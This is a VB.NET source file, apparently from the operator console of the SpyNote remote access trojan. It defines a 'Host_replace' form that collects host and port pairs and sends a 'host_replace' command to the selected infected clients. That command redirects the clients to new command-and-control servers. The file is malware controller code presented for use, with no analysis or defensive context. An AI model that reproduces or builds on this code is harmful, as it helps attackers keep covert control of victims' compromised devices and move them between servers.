Imports Microsoft.VisualBasic.CompilerServices
Imports Spy_Note.etonyps

Public Class Host_replace
    Private n As String
    Public Sub New()
        Me.n = Nothing
        Me.InitializeComponent()
    End Sub
    Public Sub host_re(idstr As String)
        Me.n = idstr
        Dim array As String() = Me.n.Trim().Split(New Char() {","c})
        Me.title(Me.Text + " - Clients:{0}", Conversions.ToString(array.Length - 1))
    End Sub

    Private Sub title(t As String, i As String)
        Dim text As String = String.Format(t, i)
        Me.Text = text
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim num As Integer = 0
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count <= 0
        If flag Then
            Me.ErrorProvider1.SetError(Me.DataGridView1, "Cannot be Empty")
        Else
            Me.ErrorProvider1.SetError(Me.DataGridView1, Nothing)
            num += 1
        End If
        Try
            For Each obj As Object In Me.GroupBox2.Controls
                Dim control As Control = CType(obj, Control)
                Dim flag2 As Boolean = Operators.CompareString(Versioned.TypeName(control), "TextBox", False) = 0
                If flag2 Then
                    Dim flag3 As Boolean = Operators.ConditionalCompareObjectEqual(control.Tag, "ERROR", False)
                    If flag3 Then
                        Dim flag4 As Boolean = control.Text.Length = 0
                        If flag4 Then
                            Me.ErrorProvider1.SetError(control, "Cannot be Empty")
                        Else
                            Me.ErrorProvider1.SetError(control, Nothing)
                            num += 1
                        End If
                    End If
                End If
            Next
        Finally
        End Try
        Dim flag5 As Boolean = num = 2
        If flag5 Then
            MyBase.DialogResult = DialogResult.OK
            Dim array As String() = Me.n.Trim().Split(New Char() {","c})
            Dim text As String = Nothing
            For Each text2 As String In array
                Dim flag6 As Boolean = Versioned.IsNumeric(text2)
                If flag6 Then
                    Dim flag7 As Boolean = Me.DataGridView1.SelectedRows.Count > 0
                    If flag7 Then
                        Dim num2 As Integer = Me.DataGridView1.Rows.Count - 1
                        For j As Integer = 0 To num2
                            text = Conversions.ToString(Operators.AddObject(text, Operators.AddObject(Operators.AddObject(Operators.AddObject(Me.DataGridView1.Rows(j).Cells(0).Value, ","), Me.DataGridView1.Rows(j).Cells(1).Value), ",")))
                        Next
                    End If
                    Dim flag8 As Boolean = text.EndsWith(",")
                    If flag8 Then
                        text.ToString().Remove(text.ToString().Length - 1).ToString()
                    End If
                    My.Forms.Form1.s.Send(Conversions.ToInteger(text2), String.Concat(New String() {"host_replace", My.Forms.Form1.s.SplitData, text, My.Forms.Form1.s.SplitData, Me.TextBox2.Text}))
                End If
            Next
        End If
    End Sub

    Private Sub Host_replace_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.NumericUpDown1.Value = New Decimal(My.Settings.SVPORT)
        Me.TextBox1.Text = My.Settings.SVHOST
        Me.TextBox2.Text = My.Settings.BIINFO2
        Me.ErrorProvider1.Icon = store_0.icons_0("errors")
        MyBase.Icon = store_0.icons_0("window")
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim flag As Boolean = Operators.CompareString(Me.TextBox1.Text, Nothing, False) <> 0 And Operators.CompareString(Conversions.ToString(Me.NumericUpDown1.Value), "0", False) <> 0
        If flag Then
            Me.DataGridView1.Rows.Add(New Object() {Me.TextBox1.Text, Conversions.ToString(Me.NumericUpDown1.Value)})
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count > 0
        If flag Then
            Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
            For i As Integer = num To 0 Step -1
                Me.DataGridView1.Rows.RemoveAt(Me.DataGridView1.SelectedRows(i).Index)
            Next
        End If
    End Sub

    Private Sub Host_replace_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        Me.ErrorProvider1.Clear()
    End Sub


End Class